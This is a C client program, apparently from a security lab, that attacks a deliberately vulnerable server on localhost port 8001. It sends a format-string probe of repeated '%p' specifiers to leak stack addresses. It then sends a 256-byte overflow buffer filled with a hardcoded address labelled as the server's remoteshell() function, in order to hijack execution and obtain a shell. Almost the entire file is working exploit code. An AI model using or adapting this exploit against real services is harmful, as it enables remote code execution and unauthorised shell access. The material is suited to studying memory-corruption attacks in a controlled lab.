/*
 * Simple demonstration of talking to our vulnerable server
 */
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	8001
#define	BLENGTH	256

/* Send our name to the server */
static void
send_name(int s)
{
  char buffer[BLENGTH];
  char response_buffer[] = "%p %p %p %p %p %p";

  /* Receive a prompt from the server */
  recv(s, (void *)buffer, BLENGTH, MSG_WAITALL);

  /* Display the prompt to the user */
  fputs(buffer, stdout);

  /* Read a response from the user */
  //fgets(buffer, BLENGTH, stdin);
  
  /* Send the response to the server */
  send(s, (void *)response_buffer, BLENGTH, 0);

  /* Receive a reply from the server */
  recv(s, (void *)response_buffer, BLENGTH, MSG_WAITALL);

  /* Display the reply to the user */
  fputs(response_buffer, stdout);
}

/* Send our message to the server */
static void
send_message(int s)
{
	int i;
	long *addr_ptr, addr;
	char request_buffer[BLENGTH];
	
	int reverseshell_addr = 0x8048a78; // location of the function remoteshell()

	
	addr = reverseshell_addr;
	printf("Using address: 0x%x\n", addr);
	
	// Set the entire responseb buffer to NOP
	memset(request_buffer, 0x90, BLENGTH);
	
	addr_ptr = (long *) request_buffer;
	for (i = 0; i < BLENGTH; i+=4)
	*(addr_ptr++) = addr;
	
	request_buffer[BLENGTH - 1] = '\0';

	/* Send the attack to the server */
	send(s, (void *)request_buffer, BLENGTH, 0);
}

/* Connect and talk to the server */
int
main()
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);

  /* Did that work? */
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* We are running the server on localhost for the minute */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in the socket address structure */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to the server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Send our name first */
  send_name(s);

  /* Now send a message */
  send_message(s);

  /* Close the socket */
  close(s);

  return (0);
}
